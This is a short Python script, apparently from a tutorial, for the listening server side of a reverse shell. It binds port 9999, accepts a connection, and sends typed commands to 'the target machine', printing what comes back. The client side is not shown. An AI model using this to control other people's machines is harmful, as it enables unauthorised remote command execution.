import socket
import sys


# create socket that allows 2 computers to connect
def socket_create():
    try:
        global host # ip address of the host
        global port # ip address of the client
        global s

        host = '' # not needed
        port = 9999
        s = socket.socket() # actual socket between server and client
    except socket.error as msg:
        print("Socket creation error " + str(msg))


# bind socket to port and wait connection from client
def socket_bind():
    try:
        global host # ip address of the host
        global port # ip address of the client
        global s

        print("Binding is on port " + str(port))
        s.bind((host,port)) # binds the host and port to the socket
        s.listen(5) # listen allows server to accept connections. 5 is the number of bad conenctions before it refuses new connetions
    except socket.error as msg:
        print("socket binding error " + str(msg))
        socket_bind()

# establish a connection. SOCKET MUST LISTEN BEFORE IT CAN ACCEPT CONNECTION
def socket_accept():
    conn, address = s.accept() # waits till connection is made
    print("connection has been established with " + address[0]  + " and port " + str(address[1]))
    send_commands(conn)
    conn.close()

# sends commands to the target machine
def send_commands(conn):
    while True:
        cmd = input() # gets input from the terminal
        if cmd == "quit":
            conn.close() # close connection
            s.close() # close the socket so the communication between 2 computers is shut down
            sys.exit()
        if (len(str.encode(cmd)) > 0): # encoded from the byte type from the terminal
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8") # received bytes and converted to string
            print(client_response,end = "")

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()
